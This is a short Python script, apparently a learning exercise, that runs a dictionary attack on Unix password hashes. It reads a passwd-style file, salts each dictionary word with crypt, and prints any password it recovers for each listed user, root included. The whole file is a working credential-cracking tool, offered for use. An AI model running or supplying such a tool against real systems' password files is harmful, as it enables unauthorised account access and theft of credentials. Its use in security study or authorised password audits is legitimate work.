"""
|--------------------------------------------------------------------------
| Cameron M. Merrick
| unix-brute-forcer.py
| 2/19/2018
|--------------------------------------------------------------------------
| Script that attempts to brute force a user's password
| on unix (when given a dictionary file and passwords file)
|
| Here is an example of how the passwords.txt file should be formatted:
|   passwords.txt
|    victim: KDSFArda328sfj: 503:100:Tim victim:/home/victim:/bin/sh
|    root: dD42j3da4k8sfj: 504:100: Cam Example:/root/:/bin/bash
|
| Credits: DrapsTV for guiding my understanding of brute forcing python scripts
|-------------------------------------------------------------------------
"""
# Need crypt to encrypt the dictionary words which we'll compare to the pw hash
import crypt
# Using optparse in order to enrich the CLI experience for the user
import optparse


def testPass(cryptPass, dictName):
    # The first two chars of the pw hash are called the 'salt'
    salt = cryptPass[0:2]
    dictFile = open(dictName, 'r')
    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptWord = crypt.crypt(word, salt)
        # encrypt teach pw. interatively thru the dict, and compare with pw hash
        if(cryptWord == cryptPass):
            # if found, inform success and for which user, then exit
            print("Found the password: " + word + '\n')
            return
    # If not, say so, and exit
    print("Password not found.\n")
    return


def main():
    # initialize parser
    parser = optparse.OptionParser("usage %prog "+"-f <passwordfile> -d <dictionary>")
    parser.add_option('-f', dest='pname', type='string', help='Specify pw file')
    parser.add_option('-d', dest='dname', type='string', help='Specify dictionary')
    (options, args) = parser.parse_args()
    # Account for user not passing any args
    if (options.pname is None) or (options.dname is None):
        print(parser.usage)
        exit(0)
    else:
        # Assign the args to the proper vars
        pname = options.pname
        dname = options.dname
    passFile = open(pname, 'r')
    for line in passFile.readlines():
        if ":" in line:
            # Due to formatting of passFile, we'll do some string manipulation
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            print("Cracking password for " + user + '\n')
            # Call the testPass function for each user in the passFile
            testPass(cryptPass, dname)


if __name__ == '__main__':
    main()
